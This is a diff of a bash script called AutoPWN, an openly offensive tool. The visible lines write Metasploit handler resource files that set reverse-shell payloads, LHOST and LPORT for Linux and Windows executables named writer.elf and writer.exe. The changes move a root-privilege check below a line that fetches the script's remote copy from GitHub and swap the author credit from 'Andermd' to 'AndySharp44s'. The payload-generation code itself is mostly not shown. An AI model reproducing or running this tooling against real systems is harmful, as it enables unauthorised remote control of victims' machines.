@@ -1,17 +1,5 @@
 #!/bin/bash
 
-if [ "$EUID" -ne 0 ]; then
-  echo -e "\e[31mThis script must be run as root. Execute sudo su and then the script, Exiting..."
-  exit 1
-fi
-
-if ! echo "STARTING..." | lolcat; then
-  clear
-  echo -e "\e[31mThis script must be run after 'sudo su', not directly with 'sudo $0'. Exiting..."
-  exit 1
-fi
-clear
-
 version="1.0"
 
 # Variables
@@ -53,6 +41,18 @@ linuxoutname="writer.elf"
 windowsoutname="writer.exe"
 
 webcon="`curl -s "https://raw.githubusercontent.com/AndySharp44s/AutoPwn/main/autopwn.sh" | cat`"
+
+if [ "$EUID" -ne 0 ]; then
+  echo -e "\e[31mThis script must be run as root. Execute sudo su and then the script, Exiting..."
+  exit 1
+fi
+
+if ! echo "STARTING..." | lolcat; then
+  clear
+  echo -e "\e[31mThis script must be run after 'sudo su', not directly with 'sudo $0'. Exiting..."
+  exit 1
+fi
+clear
 
 color_transition() {
     while true; do
@@ -133,7 +133,7 @@ clear
 
 # Presentación
 figlet "AutoPWN" -f AutoPWN/Bloody.flf | lolcat
-echo -e "                         By Andermd (v$version)\n\n\n" | lolcat
+echo -e "                    By AndySharp44s (v$version)\n\n\n" | lolcat
 sleep 5
 
 if [ "$duckdns" = "yes" ]; then
@@ -170,7 +170,7 @@ echo "set PAYLOAD $linuxpayload" >> AutoPWN/linmet.txt
 echo "set LHOST $lhost" >> AutoPWN/linmet.txt
 echo "set LPORT $linlport" >> AutoPWN/linmet.txt
 echo "exploit -j -z" >> AutoPWN/linmet.txt
-echo "clear && figlet \"AutoPWN\" -f AutoPWN/Bloody.flf && echo \"                         By Andermd (v$version)\" && echo \"                               LINUX\n\"" >> AutoPWN/linmet.txt
+echo "clear && figlet \"AutoPWN\" -f AutoPWN/Bloody.flf && echo \"                    By AndySharp44s (v$version)\" && echo \"                               LINUX\n\"" >> AutoPWN/linmet.txt
 
 echo -e "\e[9;38m[\e[9;32m+\e[9;38m] FILE CREATED\n\n"
 
@@ -182,7 +182,7 @@ echo "set PAYLOAD $windowspayload" >> AutoPWN/winmet.txt
 echo "set LHOST $lhost" >> AutoPWN/winmet.txt
 echo "set LPORT $winlport" >> AutoPWN/winmet.txt
 echo "exploit -j -z" >> AutoPWN/winmet.txt
-echo "clear && figlet \"AutoPWN\" -f AutoPWN/Bloody.flf && echo \"                         By Andermd (v$version)\" && echo \"                              WINDOWS\n\"" >> AutoPWN/winmet.txt
+echo "clear && figlet \"AutoPWN\" -f AutoPWN/Bloody.flf && echo \"                    By AndySharp44s (v$version)\" && echo \"                              WINDOWS\n\"" >> AutoPWN/winmet.txt
 
 echo -e "\e[9;38m[\e[9;32m+\e[9;38m] FILE CREATED\n\n"
 
